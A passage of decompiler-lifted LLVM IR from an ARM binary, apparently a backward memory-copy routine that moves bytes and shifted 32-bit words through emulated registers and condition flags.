  store i32 %v12_14cbc, i32* %r4.global-to-local, align 4
  %v13_14cbc = add i32 %v6_14cbc, -12
  %v14_14cbc = inttoptr i32 %v13_14cbc to i32*
  %v15_14cbc = load i32, i32* %v14_14cbc, align 4
  store i32 %v15_14cbc, i32* @ip, align 4
  %v16_14cbc = add i32 %v6_14cbc, -16
  %v17_14cbc = inttoptr i32 %v16_14cbc to i32*
  %v18_14cbc = load i32, i32* %v17_14cbc, align 4
  store i32 %v18_14cbc, i32* %lr.global-to-local, align 4
  store i32 %v16_14cbc, i32* @r1, align 4
  %v7_14cc0 = add i32 %v6_14cc0, -16
  %v8_14cc0 = inttoptr i32 %v7_14cc0 to i32*
  store i32 %v9_14cbc, i32* %v8_14cc0, align 4
  %v10_14cc0 = add i32 %v6_14cc0, -12
  %v11_14cc0 = inttoptr i32 %v10_14cc0 to i32*
  %v12_14cc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v12_14cc0, i32* %v11_14cc0, align 4
  %v13_14cc0 = add i32 %v6_14cc0, -8
  %v14_14cc0 = inttoptr i32 %v13_14cc0 to i32*
  %v15_14cc0 = load i32, i32* @ip, align 4
  store i32 %v15_14cc0, i32* %v14_14cc0, align 4
  %v16_14cc0 = add i32 %v6_14cc0, -4
  %v17_14cc0 = inttoptr i32 %v16_14cc0 to i32*
  %v18_14cc0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v18_14cc0, i32* %v17_14cc0, align 4
  store i32 %v7_14cc0, i32* %r0.global-to-local, align 4
  %v6_14cc4 = load i32, i32* %r2.global-to-local, align 4
  %v7_14cc4 = add i32 %v6_14cc4, -16
  store i32 %v7_14cc4, i32* %r2.global-to-local, align 4
  br label %.thread14

.thread14:                                        ; preds = %dec_label_pc_14cb8, %bb140
  %v6_14cd0 = phi i32 [ %v7_14cc0, %bb140 ], [ %v6_14cc0, %dec_label_pc_14cb8 ]
  %v0_14cc8 = phi i32 [ %v7_14cc4, %bb140 ], [ %v0_14cc8.pr, %dec_label_pc_14cb8 ]
  %v4_14cc8 = add i32 %v0_14cc8, 20
  store i32 %v4_14cc8, i32* %r2.global-to-local, align 4
  %v6_14cc8 = sub i32 0, %v0_14cc8
  %v7_14cc8 = and i32 %v4_14cc8, %v6_14cc8
  %v8_14cc8 = icmp slt i32 %v7_14cc8, 0
  store i1 %v8_14cc8, i1* %cpsr_v.global-to-local, align 1
  %v9_14cc8 = icmp slt i32 %v4_14cc8, 0
  store i1 %v9_14cc8, i1* %cpsr_n.global-to-local, align 1
  %v5_14ccc = icmp slt i32 %v0_14cc8, -20
  br i1 %v5_14ccc, label %.thread16, label %bb141

bb141:                                            ; preds = %.thread14
  %v6_14ccc = load i32, i32* @r1, align 4
  %v7_14ccc = add i32 %v6_14ccc, -4
  %v8_14ccc = inttoptr i32 %v7_14ccc to i32*
  %v9_14ccc = load i32, i32* %v8_14ccc, align 4
  store i32 %v9_14ccc, i32* %r3.global-to-local, align 4
  %v10_14ccc = add i32 %v6_14ccc, -8
  %v11_14ccc = inttoptr i32 %v10_14ccc to i32*
  %v12_14ccc = load i32, i32* %v11_14ccc, align 4
  store i32 %v12_14ccc, i32* @ip, align 4
  %v13_14ccc = add i32 %v6_14ccc, -12
  %v14_14ccc = inttoptr i32 %v13_14ccc to i32*
  %v15_14ccc = load i32, i32* %v14_14ccc, align 4
  store i32 %v15_14ccc, i32* %lr.global-to-local, align 4
  store i32 %v13_14ccc, i32* @r1, align 4
  %v7_14cd0 = add i32 %v6_14cd0, -12
  %v8_14cd0 = inttoptr i32 %v7_14cd0 to i32*
  store i32 %v9_14ccc, i32* %v8_14cd0, align 4
  %v10_14cd0 = add i32 %v6_14cd0, -8
  %v11_14cd0 = inttoptr i32 %v10_14cd0 to i32*
  %v12_14cd0 = load i32, i32* @ip, align 4
  store i32 %v12_14cd0, i32* %v11_14cd0, align 4
  %v13_14cd0 = add i32 %v6_14cd0, -4
  %v14_14cd0 = inttoptr i32 %v13_14cd0 to i32*
  %v15_14cd0 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v15_14cd0, i32* %v14_14cd0, align 4
  store i32 %v7_14cd0, i32* %r0.global-to-local, align 4
  %v6_14cd4 = load i32, i32* %r2.global-to-local, align 4
  %v7_14cd4 = add i32 %v6_14cd4, -12
  store i32 %v7_14cd4, i32* %r2.global-to-local, align 4
  br label %.thread16

.thread16:                                        ; preds = %.thread14, %bb141
  %v6_14cf457 = phi i32 [ %v6_14cd0, %.thread14 ], [ %v7_14cd0, %bb141 ]
  %v0_14cdc55 = phi i32 [ %v4_14cc8, %.thread14 ], [ %v7_14cd4, %bb141 ]
  %v2_14cd8 = load i8*, i8** %stack_var_-8, align 4
  %v3_14cd8 = ptrtoint i8* %v2_14cd8 to i32
  store i32 %v3_14cd8, i32* @r4, align 4
  store i32 %v8_14c94, i32* @lr, align 4
  br label %dec_label_pc_14cdc

dec_label_pc_14cdc:                               ; preds = %dec_label_pc_14c8c, %.thread16
  %v7_14cec = phi i32 [ %v0_14ca449, %dec_label_pc_14c8c ], [ %v6_14cf457, %.thread16 ]
  %v0_14cdc = phi i32 [ %v2_14c8c, %dec_label_pc_14c8c ], [ %v0_14cdc55, %.thread16 ]
  %v2_14cdc = add i32 %v0_14cdc, 8
  store i32 %v2_14cdc, i32* %r2.global-to-local, align 4
  %v4_14cdc = sub i32 0, %v0_14cdc
  %v5_14cdc = and i32 %v2_14cdc, %v4_14cdc
  %v6_14cdc = icmp slt i32 %v5_14cdc, 0
  store i1 %v6_14cdc, i1* %cpsr_v.global-to-local, align 1
  %v7_14cdc = icmp slt i32 %v2_14cdc, 0
  store i1 %v7_14cdc, i1* %cpsr_n.global-to-local, align 1
  %v5_14ce0 = icmp slt i32 %v0_14cdc, -8
  br i1 %v5_14ce0, label %bb143, label %dec_label_pc_14ce4

dec_label_pc_14ce4:                               ; preds = %dec_label_pc_14cdc
  %v6_14ce4 = add i32 %v0_14cdc, 4
  store i32 %v6_14ce4, i32* %r2.global-to-local, align 4
  %v8_14ce4 = sub i32 -5, %v0_14cdc
  %v9_14ce4 = and i32 %v8_14ce4, %v2_14cdc
  %v10_14ce4 = icmp slt i32 %v9_14ce4, 0
  store i1 %v10_14ce4, i1* %cpsr_v.global-to-local, align 1
  %v11_14ce4 = icmp slt i32 %v6_14ce4, 0
  store i1 %v11_14ce4, i1* %cpsr_n.global-to-local, align 1
  %v5_14ce8 = icmp slt i32 %v2_14cdc, 4
  %v6_14ce8 = load i32, i32* @r1, align 4
  %v7_14ce8 = add i32 %v6_14ce8, -4
  %v8_14ce8 = inttoptr i32 %v7_14ce8 to i32*
  %v9_14ce8 = load i32, i32* %v8_14ce8, align 4
  store i32 %v9_14ce8, i32* %r3.global-to-local, align 4
  br i1 %v5_14ce8, label %.thread20, label %bb142

.thread20:                                        ; preds = %dec_label_pc_14ce4
  store i32 %v7_14ce8, i32* @r1, align 4
  %v8_14cec = add i32 %v7_14cec, -4
  %v9_14cec = inttoptr i32 %v8_14cec to i32*
  store i32 %v9_14ce8, i32* %v9_14cec, align 4
  %v10_14cec = load i32, i32* %r0.global-to-local, align 4
  %v11_14cec = add i32 %v10_14cec, -4
  store i32 %v11_14cec, i32* %r0.global-to-local, align 4
  %v0_14cfc.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb143

bb142:                                            ; preds = %dec_label_pc_14ce4
  %v10_14cf0 = add i32 %v6_14ce8, -8
  %v11_14cf0 = inttoptr i32 %v10_14cf0 to i32*
  %v12_14cf0 = load i32, i32* %v11_14cf0, align 4
  store i32 %v12_14cf0, i32* @ip, align 4
  store i32 %v10_14cf0, i32* @r1, align 4
  %v7_14cf4 = add i32 %v7_14cec, -8
  %v8_14cf4 = inttoptr i32 %v7_14cf4 to i32*
  store i32 %v9_14ce8, i32* %v8_14cf4, align 4
  %v10_14cf4 = add i32 %v7_14cec, -4
  %v11_14cf4 = inttoptr i32 %v10_14cf4 to i32*
  %v12_14cf4 = load i32, i32* @ip, align 4
  store i32 %v12_14cf4, i32* %v11_14cf4, align 4
  store i32 %v7_14cf4, i32* %r0.global-to-local, align 4
  %v6_14cf8 = load i32, i32* %r2.global-to-local, align 4
  %v7_14cf8 = add i32 %v6_14cf8, -4
  store i32 %v7_14cf8, i32* %r2.global-to-local, align 4
  br label %bb143

bb143:                                            ; preds = %.thread20, %.thread26, %dec_label_pc_14cdc, %dec_label_pc_14c6c, %dec_label_pc_14ea0, %dec_label_pc_14e34, %dec_label_pc_14dc8, %bb142
  %v2_14d00 = phi i32 [ %v11_14cec, %.thread20 ], [ %v0_14d9832, %.thread26 ], [ %v7_14cec, %dec_label_pc_14cdc ], [ %v2_14c70, %dec_label_pc_14c6c ], [ %v2_14d0c65, %dec_label_pc_14ea0 ], [ %v2_14d0c64, %dec_label_pc_14e34 ], [ %v2_14d0c63, %dec_label_pc_14dc8 ], [ %v7_14cf4, %bb142 ]
  %v0_14cfc = phi i32 [ %v0_14cfc.pre, %.thread20 ], [ %v2_14d40, %.thread26 ], [ %v2_14cdc, %dec_label_pc_14cdc ], [ %v2_14c74, %dec_label_pc_14c6c ], [ %v0_14cfc61, %dec_label_pc_14ea0 ], [ %v0_14cfc60, %dec_label_pc_14e34 ], [ %v0_14cfc59, %dec_label_pc_14dc8 ], [ %v7_14cf8, %bb142 ]
  %v1_14cfc = add i32 %v0_14cfc, 4
  store i32 %v1_14cfc, i32* @r2, align 4
  %v3_14cfc = sub i32 0, %v0_14cfc
  %v4_14cfc = and i32 %v1_14cfc, %v3_14cfc
  %v5_14cfc = icmp slt i32 %v4_14cfc, 0
  store i1 %v5_14cfc, i1* %cpsr_v.global-to-local, align 1
  %v6_14cfc = icmp slt i32 %v1_14cfc, 0
  store i1 %v6_14cfc, i1* %cpsr_n.global-to-local, align 1
  %v7_14cfc = icmp eq i32 %v1_14cfc, 0
  store i1 %v7_14cfc, i1* @cpsr_z, align 1
  br i1 %v7_14cfc, label %.thread123, label %bb144

bb144:                                            ; preds = %bb143
  %v1_14d04 = add i32 %v0_14cfc, 2
  %v3_14d04 = sub i32 -3, %v0_14cfc
  %v4_14d04 = and i32 %v3_14d04, %v1_14cfc
  %v5_14d04 = icmp slt i32 %v4_14d04, 0
  store i1 %v5_14d04, i1* %cpsr_v.global-to-local, align 1
  %v6_14d04 = icmp slt i32 %v1_14d04, 0
  store i1 %v6_14d04, i1* %cpsr_n.global-to-local, align 1
  %v7_14d04 = icmp eq i32 %v1_14cfc, 2
  store i1 %v7_14d04, i1* @cpsr_z, align 1
  %v0_14d08 = load i32, i32* @r1, align 4
  %v1_14d08 = add i32 %v0_14d08, -1
  %v2_14d08 = inttoptr i32 %v1_14d08 to i8*
  %v3_14d08 = load i8, i8* %v2_14d08, align 1
  %v4_14d08 = zext i8 %v3_14d08 to i32
  store i32 %v4_14d08, i32* %r3.global-to-local, align 4
  store i32 %v1_14d08, i32* @r1, align 4
  %v3_14d0c = add i32 %v2_14d00, -1
  %v4_14d0c = inttoptr i32 %v3_14d0c to i8*
  store i8 %v3_14d08, i8* %v4_14d0c, align 1
  %v5_14d0c = load i32, i32* %r0.global-to-local, align 4
  %v6_14d0c = add i32 %v5_14d0c, -1
  store i32 %v6_14d0c, i32* %r0.global-to-local, align 4
  %v0_14d10 = load i1, i1* %cpsr_n.global-to-local, align 1
  %v1_14d10 = load i1, i1* %cpsr_v.global-to-local, align 1
  %v2_14d10 = xor i1 %v0_14d10, %v1_14d10
  br i1 %v2_14d10, label %.thread122, label %bb145

bb145:                                            ; preds = %bb144
  %v3_14d10 = load i32, i32* @r1, align 4
  %v4_14d10 = add i32 %v3_14d10, -1
  %v5_14d10 = inttoptr i32 %v4_14d10 to i8*
  %v6_14d10 = load i8, i8* %v5_14d10, align 1
  %v7_14d10 = zext i8 %v6_14d10 to i32
  store i32 %v7_14d10, i32* %r3.global-to-local, align 4
  store i32 %v4_14d10, i32* @r1, align 4
  %v6_14d14 = add i32 %v5_14d0c, -2
  %v7_14d14 = inttoptr i32 %v6_14d14 to i8*
  store i8 %v6_14d10, i8* %v7_14d14, align 1
  %v8_14d14 = load i32, i32* %r0.global-to-local, align 4
  %v9_14d14 = add i32 %v8_14d14, -1
  store i32 %v9_14d14, i32* %r0.global-to-local, align 4
  %v1_14d18.pre = load i1, i1* %cpsr_n.global-to-local, align 1
  %v2_14d18.pre = load i1, i1* %cpsr_v.global-to-local, align 1
  br label %.thread122

.thread122:                                       ; preds = %bb144, %bb145
  %v7_14d1c = phi i32 [ %v9_14d14, %bb145 ], [ %v6_14d0c, %bb144 ]
  %v2_14d1c = phi i1 [ %v2_14d18.pre, %bb145 ], [ %v1_14d10, %bb144 ]
  %v1_14d1c = phi i1 [ %v1_14d18.pre, %bb145 ], [ %v0_14d10, %bb144 ]
  %v0_14d18 = load i1, i1* @cpsr_z, align 1
  %v3_14d18 = xor i1 %v2_14d1c, %v1_14d1c
  %v4_14d18 = or i1 %v0_14d18, %v3_14d18
  br i1 %v4_14d18, label %.thread123, label %bb146

bb146:                                            ; preds = %.thread122
  %v5_14d18 = load i32, i32* @r1, align 4
  %v6_14d18 = add i32 %v5_14d18, -1
  %v7_14d18 = inttoptr i32 %v6_14d18 to i8*
  %v8_14d18 = load i8, i8* %v7_14d18, align 1
  %v9_14d18 = zext i8 %v8_14d18 to i32
  store i32 %v9_14d18, i32* %r3.global-to-local, align 4
  store i32 %v6_14d18, i32* @r1, align 4
  %v8_14d1c = add i32 %v7_14d1c, -1
  %v9_14d1c = inttoptr i32 %v8_14d1c to i8*
  store i8 %v8_14d18, i8* %v9_14d1c, align 1
  %v10_14d1c = load i32, i32* %r0.global-to-local, align 4
  %v11_14d1c = add i32 %v10_14d1c, -1
  store i32 %v11_14d1c, i32* %r0.global-to-local, align 4
  br label %.thread123

dec_label_pc_14d24:                               ; preds = %dec_label_pc_14c7c
  store i1 false, i1* %cpsr_v.global-to-local, align 1
  %v8_14d24 = icmp eq i32 %v1_14c7c, 1
  store i1 %v8_14d24, i1* %cpsr_n.global-to-local, align 1
  %v1_14d28 = add i32 %v2_14c6c, -1
  %v2_14d28 = inttoptr i32 %v1_14d28 to i8*
  %v3_14d28 = load i8, i8* %v2_14d28, align 1
  %v4_14d28 = zext i8 %v3_14d28 to i32
  store i32 %v4_14d28, i32* %r3.global-to-local, align 4
  store i32 %v1_14d28, i32* @r1, align 4
  %v3_14d2c = add i32 %v2_14c70, -1
  %v4_14d2c = inttoptr i32 %v3_14d2c to i8*
  store i8 %v3_14d28, i8* %v4_14d2c, align 1
  %v5_14d2c = load i32, i32* %r0.global-to-local, align 4
  %v6_14d2c = add i32 %v5_14d2c, -1
  store i32 %v6_14d2c, i32* %r0.global-to-local, align 4
  br i1 %v8_14d24, label %.thread26, label %bb147

bb147:                                            ; preds = %dec_label_pc_14d24
  %v9_14d24 = icmp eq i32 %v1_14c7c, 2
  %v6_14d30 = load i32, i32* @r1, align 4
  %v7_14d30 = add i32 %v6_14d30, -1
  %v8_14d30 = inttoptr i32 %v7_14d30 to i8*
  %v9_14d30 = load i8, i8* %v8_14d30, align 1
  %v10_14d30 = zext i8 %v9_14d30 to i32
  store i32 %v10_14d30, i32* %r3.global-to-local, align 4
  store i32 %v7_14d30, i32* @r1, align 4
  %v9_14d34 = add i32 %v5_14d2c, -2
  %v10_14d34 = inttoptr i32 %v9_14d34 to i8*
  store i8 %v9_14d30, i8* %v10_14d34, align 1
  %v11_14d34 = load i32, i32* %r0.global-to-local, align 4
  %v12_14d34 = add i32 %v11_14d34, -1
  store i32 %v12_14d34, i32* %r0.global-to-local, align 4
  br i1 %v9_14d24, label %.thread26, label %bb148

bb148:                                            ; preds = %bb147
  %v8_14d38 = load i32, i32* @r1, align 4
  %v9_14d38 = add i32 %v8_14d38, -1
  %v10_14d38 = inttoptr i32 %v9_14d38 to i8*
  %v11_14d38 = load i8, i8* %v10_14d38, align 1
  %v12_14d38 = zext i8 %v11_14d38 to i32
  store i32 %v12_14d38, i32* %r3.global-to-local, align 4
  store i32 %v9_14d38, i32* @r1, align 4
  %v11_14d3c = add i32 %v11_14d34, -2
  %v12_14d3c = inttoptr i32 %v11_14d3c to i8*
  store i8 %v11_14d38, i8* %v12_14d3c, align 1
  %v13_14d3c = load i32, i32* %r0.global-to-local, align 4
  %v14_14d3c = add i32 %v13_14d3c, -1
  store i32 %v14_14d3c, i32* %r0.global-to-local, align 4
  br label %.thread26

.thread26:                                        ; preds = %bb147, %dec_label_pc_14d24, %bb148
  %v0_14d9832 = phi i32 [ %v12_14d34, %bb147 ], [ %v6_14d2c, %dec_label_pc_14d24 ], [ %v14_14d3c, %bb148 ]
  %v0_14d40 = load i32, i32* %r2.global-to-local, align 4
  %v1_14d40 = load i32, i32* @ip, align 4
  %v2_14d40 = sub i32 %v0_14d40, %v1_14d40
  store i32 %v2_14d40, i32* %r2.global-to-local, align 4
  %v4_14d40 = xor i32 %v1_14d40, %v0_14d40
  %v5_14d40 = xor i32 %v2_14d40, %v0_14d40
  %v6_14d40 = and i32 %v5_14d40, %v4_14d40
  %v7_14d40 = icmp slt i32 %v6_14d40, 0
  store i1 %v7_14d40, i1* %cpsr_v.global-to-local, align 1
  %v8_14d40 = icmp slt i32 %v2_14d40, 0
  store i1 %v8_14d40, i1* %cpsr_n.global-to-local, align 1
  %v5_14d44 = icmp slt i32 %v0_14d40, %v1_14d40
  br i1 %v5_14d44, label %bb143, label %dec_label_pc_14d48

dec_label_pc_14d48:                               ; preds = %.thread26
  %v0_14d48 = load i32, i32* @r1, align 4
  %v1_14d48 = urem i32 %v0_14d48, 4
  store i32 %v1_14d48, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_14d48 = icmp eq i32 %v1_14d48, 0
  br i1 %v2_14d48, label %dec_label_pc_14c8c, label %dec_label_pc_14d50

dec_label_pc_14d50:                               ; preds = %dec_label_pc_14c84, %dec_label_pc_14d48
  %v0_14d9831 = phi i32 [ %v2_14c70, %dec_label_pc_14c84 ], [ %v0_14d9832, %dec_label_pc_14d48 ]
  %v0_14e44 = phi i32 [ %v2_14c74, %dec_label_pc_14c84 ], [ %v2_14d40, %dec_label_pc_14d48 ]
  %v0_14d50 = phi i32 [ %v2_14c6c, %dec_label_pc_14c84 ], [ %v0_14d48, %dec_label_pc_14d48 ]
  %v0_14d58 = phi i32 [ %v1_14c84, %dec_label_pc_14c84 ], [ %v1_14d48, %dec_label_pc_14d48 ]
  %v1_14d50 = and i32 %v0_14d50, -4
  store i32 %v1_14d50, i32* %r1.global-to-local, align 4
  %v1_14d54 = inttoptr i32 %v1_14d50 to i32*
  %v2_14d54 = load i32, i32* %v1_14d54, align 4
  store i32 %v2_14d54, i32* %r3.global-to-local, align 4
  %v7_14d58 = icmp ult i32 %v0_14d58, 2
  %v2_14e3c = add i32 %v0_14e44, -12
  %v4_14e3c = sub i32 11, %v0_14e44
  %v5_14e3c = and i32 %v4_14e3c, %v0_14e44
  %v6_14e3c = icmp slt i32 %v5_14e3c, 0
  store i1 %v6_14e3c, i1* %cpsr_v.global-to-local, align 1
  %v7_14e3c = icmp slt i32 %v2_14e3c, 0
  store i1 %v7_14e3c, i1* %cpsr_n.global-to-local, align 1
  %v5_14e40 = icmp slt i32 %v0_14e44, 12
  br i1 %v7_14d58, label %dec_label_pc_14e3c, label %dec_label_pc_14d60

dec_label_pc_14d60:                               ; preds = %dec_label_pc_14d50
  %v8_14d58 = icmp eq i32 %v0_14d58, 2
  br i1 %v8_14d58, label %dec_label_pc_14dd0, label %dec_label_pc_14d64

dec_label_pc_14d64:                               ; preds = %dec_label_pc_14d60
  br i1 %v5_14e40, label %dec_label_pc_14db0, label %dec_label_pc_14d6c

dec_label_pc_14d6c:                               ; preds = %dec_label_pc_14d64
  store i32 %v2_14e3c, i32* %r2.global-to-local, align 4
  %v3_14d70 = load i32, i32* @r4, align 4
  store i32 %v3_14d70, i32* %stack_var_-12, align 4
  %v6_14d70 = load i32, i32* @r5, align 4
  %v8_14d70 = inttoptr i32 %v6_14d70 to i8*
  store i8* %v8_14d70, i8** %stack_var_-8, align 4
  %v11_14d70 = load i32, i32* @lr, align 4
  br label %dec_label_pc_14d74

dec_label_pc_14d74:                               ; preds = %dec_label_pc_14d74.dec_label_pc_14d74_crit_edge, %dec_label_pc_14d6c
  %v0_14d98 = phi i32 [ %v1_14d98, %dec_label_pc_14d74.dec_label_pc_14d74_crit_edge ], [ %v0_14d9831, %dec_label_pc_14d6c ]
  %v0_14d78 = phi i32 [ %v0_14d78.pre, %dec_label_pc_14d74.dec_label_pc_14d74_crit_edge ], [ %v1_14d50, %dec_label_pc_14d6c ]
  %v0_14d74 = phi i32 [ %v0_14d74.pre, %dec_label_pc_14d74.dec_label_pc_14d74_crit_edge ], [ %v2_14d54, %dec_label_pc_14d6c ]
  %v3_14d74 = mul i32 %v0_14d74, 256
  store i32 %v3_14d74, i32* %lr.global-to-local, align 4
  %v1_14d78 = add i32 %v0_14d78, -4
  %v2_14d78 = inttoptr i32 %v1_14d78 to i32*
  %v3_14d78 = load i32, i32* %v2_14d78, align 4
  store i32 %v3_14d78, i32* %r3.global-to-local, align 4
  %v4_14d78 = add i32 %v0_14d78, -8
  %v5_14d78 = inttoptr i32 %v4_14d78 to i32*
  %v6_14d78 = load i32, i32* %v5_14d78, align 4
  store i32 %v6_14d78, i32* %r4.global-to-local, align 4
  %v7_14d78 = add i32 %v0_14d78, -12
  %v8_14d78 = inttoptr i32 %v7_14d78 to i32*
  %v9_14d78 = load i32, i32* %v8_14d78, align 4
  store i32 %v9_14d78, i32* %r5.global-to-local, align 4
  %v10_14d78 = add i32 %v0_14d78, -16
  %v11_14d78 = inttoptr i32 %v10_14d78 to i32*
  %v12_14d78 = load i32, i32* %v11_14d78, align 4
  store i32 %v10_14d78, i32* %r1.global-to-local, align 4
  %v4_14d7c = udiv i32 %v12_14d78, 16777216
  %v5_14d7c = or i32 %v4_14d7c, %v3_14d74
  store i32 %v5_14d7c, i32* %lr.global-to-local, align 4
  %v3_14d80 = mul i32 %v12_14d78, 256
  %v4_14d84 = udiv i32 %v9_14d78, 16777216
  %v5_14d84 = or i32 %v3_14d80, %v4_14d84
  store i32 %v5_14d84, i32* @ip, align 4
  %v3_14d88 = mul i32 %v9_14d78, 256
  %v4_14d8c = udiv i32 %v6_14d78, 16777216
  %v5_14d8c = or i32 %v3_14d88, %v4_14d8c
  store i32 %v5_14d8c, i32* %r5.global-to-local, align 4
  %v3_14d90 = mul i32 %v6_14d78, 256
  %v4_14d94 = udiv i32 %v3_14d78, 16777216
  %v5_14d94 = or i32 %v3_14d90, %v4_14d94
  store i32 %v5_14d94, i32* %r4.global-to-local, align 4
  %v1_14d98 = add i32 %v0_14d98, -16
  %v2_14d98 = inttoptr i32 %v1_14d98 to i32*
  store i32 %v5_14d94, i32* %v2_14d98, align 4
  %v4_14d98 = add i32 %v0_14d98, -12
  %v5_14d98 = inttoptr i32 %v4_14d98 to i32*
  %v6_14d98 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v6_14d98, i32* %v5_14d98, align 4
  %v7_14d98 = add i32 %v0_14d98, -8
  %v8_14d98 = inttoptr i32 %v7_14d98 to i32*
  %v9_14d98 = load i32, i32* @ip, align 4
  store i32 %v9_14d98, i32* %v8_14d98, align 4
  %v10_14d98 = add i32 %v0_14d98, -4
  %v11_14d98 = inttoptr i32 %v10_14d98 to i32*
  %v12_14d98 = load i32, i32* %lr.global-to-local, align 4
  store i32 %v12_14d98, i32* %v11_14d98, align 4
  store i32 %v1_14d98, i32* %r0.global-to-local, align 4
  %v0_14d9c = load i32, i32* %r2.global-to-local, align 4
  %v2_14d9c = add i32 %v0_14d9c, -16
  store i32 %v2_14d9c, i32* %r2.global-to-local, align 4
  %v6_14da0 = icmp slt i32 %v0_14d9c, 16
  br i1 %v6_14da0, label %dec_label_pc_14da4, label %dec_label_pc_14d74.dec_label_pc_14d74_crit_edge

dec_label_pc_14d74.dec_label_pc_14d74_crit_edge:  ; preds = %dec_label_pc_14d74
  %v0_14d74.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_14d78.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_14d74

dec_label_pc_14da4:                               ; preds = %dec_label_pc_14d74
  %v2_14da4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14da4, i32* @r4, align 4
  %v5_14da4 = load i8*, i8** %stack_var_-8, align 4
  %v6_14da4 = ptrtoint i8* %v5_14da4 to i32
  store i32 %v6_14da4, i32* @r5, align 4
  store i32 %v11_14d70, i32* @lr, align 4
  %v2_14da8 = add i32 %v0_14d9c, -4
  store i32 %v2_14da8, i32* %r2.global-to-local, align 4
  %v4_14da8 = add i32 %v0_14d9c, 2147483632
  %v5_14da8 = and i32 %v2_14da8, %v4_14da8
  %v6_14da8 = icmp slt i32 %v5_14da8, 0
  store i1 %v6_14da8, i1* %cpsr_v.global-to-local, align 1
  %v7_14da8 = icmp slt i32 %v2_14da8, 0
  store i1 %v7_14da8, i1* %cpsr_n.global-to-local, align 1
  %v5_14dac = icmp slt i32 %v2_14d9c, -12
  br i1 %v5_14dac, label %dec_label_pc_14dc8, label %dec_label_pc_14db0

dec_label_pc_14db0:                               ; preds = %dec_label_pc_14da4, %dec_label_pc_14d64, %dec_label_pc_14db0
  %v1_14dbc = phi i32 [ %v5_14dbc, %dec_label_pc_14db0 ], [ %v1_14d98, %dec_label_pc_14da4 ], [ %v0_14d9831, %dec_label_pc_14d64 ]
  %v0_14db0 = load i32, i32* %r3.global-to-local, align 4
  %v3_14db0 = mul i32 %v0_14db0, 256
  store i32 %v3_14db0, i32* %ip.global-to-local, align 4
  %v0_14db4 = load i32, i32* %r1.global-to-local, align 4
  %v1_14db4 = add i32 %v0_14db4, -4
  %v2_14db4 = inttoptr i32 %v1_14db4 to i32*
  %v3_14db4 = load i32, i32* %v2_14db4, align 4
  store i32 %v3_14db4, i32* %r3.global-to-local, align 4
  store i32 %v1_14db4, i32* %r1.global-to-local, align 4
  %v4_14db8 = udiv i32 %v3_14db4, 16777216
  %v5_14db8 = or i32 %v4_14db8, %v3_14db0
  store i32 %v5_14db8, i32* @ip, align 4
  %v2_14dbc = add i32 %v1_14dbc, -4
  %v3_14dbc = inttoptr i32 %v2_14dbc to i32*
  store i32 %v5_14db8, i32* %v3_14dbc, align 4
  %v4_14dbc = load i32, i32* %r0.global-to-local, align 4
  %v5_14dbc = add i32 %v4_14dbc, -4
  store i32 %v5_14dbc, i32* %r0.global-to-local, align 4
  %v0_14dc0 = load i32, i32* %r2.global-to-local, align 4
  %v2_14dc0 = add i32 %v0_14dc0, -4
  store i32 %v2_14dc0, i32* %r2.global-to-local, align 4
  %v6_14dc4 = icmp slt i32 %v0_14dc0, 4
  br i1 %v6_14dc4, label %dec_label_pc_14dc8.loopexit, label %dec_label_pc_14db0

dec_label_pc_14dc8.loopexit:                      ; preds = %dec_label_pc_14db0
  %v4_14dc0 = sub i32 3, %v0_14dc0
  %v5_14dc0 = and i32 %v4_14dc0, %v0_14dc0
  %v6_14dc0 = icmp slt i32 %v5_14dc0, 0
  %v7_14dc0 = icmp slt i32 %v2_14dc0, 0
  store i1 %v6_14dc0, i1* %cpsr_v.global-to-local, align 1
  store i1 %v7_14dc0, i1* %cpsr_n.global-to-local, align 1
  br label %dec_label_pc_14dc8

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14dc8.loopexit, %dec_label_pc_14da4
  %v2_14d0c63 = phi i32 [ %v5_14dbc, %dec_label_pc_14dc8.loopexit ], [ %v1_14d98, %dec_label_pc_14da4 ]
  %v0_14cfc59 = phi i32 [ %v2_14dc0, %dec_label_pc_14dc8.loopexit ], [ %v2_14da8, %dec_label_pc_14da4 ]
  %v0_14dc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_14dc8 = add i32 %v0_14dc8, 3
  store i32 %v1_14dc8, i32* @r1, align 4
  br label %bb143

dec_label_pc_14dd0:                               ; preds = %dec_label_pc_14d60
  br i1 %v5_14e40, label %dec_label_pc_14e1c, label %dec_label_pc_14dd8

dec_label_pc_14dd8:                               ; preds = %dec_label_pc_14dd0
  store i32 %v2_14e3c, i32* %r2.global-to-local, align 4
  %v3_14ddc = load i32, i32* @r4, align 4
  store i32 %v3_14ddc, i32* %stack_var_-12, align 4
  %v6_14ddc = load i32, i32* @r5, align 4
  %v8_14ddc = inttoptr i32 %v6_14ddc to i8*
  store i8* %v8_14ddc, i8** %stack_var_-8, align 4
  %v11_14ddc = load i32, i32* @lr, align 4
  br label %dec_label_pc_14de0

dec_label_pc_14de0:                               ; preds = %dec_label_pc_14de0.dec_label_pc_14de0_crit_edge, %dec_label_pc_14dd8
  %v0_14e04 = phi i32 [ %v1_14e04, %dec_label_pc_14de0.dec_label_pc_14de0_crit_edge ], [ %v0_14d9831, %dec_label_pc_14dd8 ]
  %v0_14de4 = phi i32 [ %v0_14de4.pre, %dec_label_pc_14de0.dec_label_pc_14de0_crit_edge ], [ %v1_14d50, %dec_label_pc_14dd8 ]
  %v0_14de0 = phi i32 [ %v0_14de0.pre, %dec_label_pc_14de0.dec_label_pc_14de0_crit_edge ], [ %v2_14d54, %dec_label_pc_14dd8 ]
  %v3_14de0 = mul i32 %v0_14de0, 65536
  store i32 %v3_14de0, i32* %lr.global-to-local, align 4
  %v1_14de4 = add i32 %v0_14de4, -4
  %v2_14de4 = inttoptr i32 %v1_14de4 to i32*
  %v3_14de4 = load i32, i32* %v2_14de4, align 4
  store i32 %v3_14de4, i32* %r3.global-to-local, align 4
  %v4_14de4 = add i32 %v0_14de4, -8
  %v5_14de4 = inttoptr i32 %v4_14de4 to i32*
